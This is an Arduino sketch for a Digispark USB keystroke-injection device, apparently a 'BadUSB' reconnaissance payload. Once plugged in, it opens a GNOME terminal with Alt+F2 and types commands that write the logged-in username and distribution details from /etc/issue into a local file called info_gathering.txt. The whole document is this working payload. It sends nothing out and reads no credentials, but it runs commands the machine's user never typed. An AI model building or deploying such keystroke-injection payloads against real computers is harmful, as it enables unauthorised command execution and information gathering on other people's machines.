#define kbd_es_es
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.update();
  delay(5000);
}

void loop() {
  DigiKeyboard.sendKeyStroke(KEY_F2, MOD_ALT_LEFT);
  delay(1000);
  DigiKeyboard.println("gnome-terminal");
  delay(3000);
  DigiKeyboard.println("echo \"Logged in user: \" $USER > info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("echo >> info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("echo -n \"Distribution Kernel Version: \" >> info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("cat /etc/issue | cut -c1-13 >> info_gathering.txt");
  delay(2000);
  while(1);
}
